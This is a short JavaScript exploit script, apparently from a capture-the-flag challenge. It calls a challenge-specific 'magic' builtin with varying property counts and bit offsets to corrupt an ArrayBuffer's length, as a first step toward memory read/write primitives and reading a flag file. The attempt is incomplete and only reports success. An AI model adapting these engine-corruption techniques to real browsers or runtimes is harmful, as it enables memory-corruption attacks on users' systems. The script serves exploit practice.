// Systematic search for working corruption
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);

function d2u(d) {
    f64[0] = d;
    return u64[0];
}

// Try the approach from test files: many properties + ArrayBuffer
const N_VALUES = [50, 60, 70, 73, 75, 80, 90, 100];
const BIT_VALUES = [32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45];

for (let n_idx = 0; n_idx < N_VALUES.length; n_idx++) {
    let N = N_VALUES[n_idx];
    
    for (let b_idx = 0; b_idx < BIT_VALUES.length; b_idx++) {
        let bit = BIT_VALUES[b_idx];
        
        // Fresh setup for each attempt
        let arr = [1.1, 2.2];
        for (let i = 0; i < N; i++) {
            arr['p' + i] = i;
        }
        
        let ab = new ArrayBuffer(0x200);
        let orig_len = ab.byteLength;
        
        // The ONE magic call
        try {
            arr.magic(arr.length, bit);
        } catch(e) {
            console.log(`N=${N}, bit=${bit}: ${e}`);
            break; // Can only call magic once!
        }
        
        // Check if ArrayBuffer was corrupted
        if (ab.byteLength !== orig_len) {
            console.log(`SUCCESS! N=${N}, bit=${bit}`);
            console.log(`ArrayBuffer length: ${orig_len} -> ${ab.byteLength}`);
            
            // Now exploit it!
            let dv = new DataView(ab);
            
            // Try to find flag file by reading /home/user directory
            // But we need more primitives for that...
            console.log("We have corrupted ArrayBuffer!");
            
            break;
        }
        
        // Only first iteration works due to magic() limit
        break;
    }
    break; // Can only call magic once per execution
}

console.log("Search completed.");
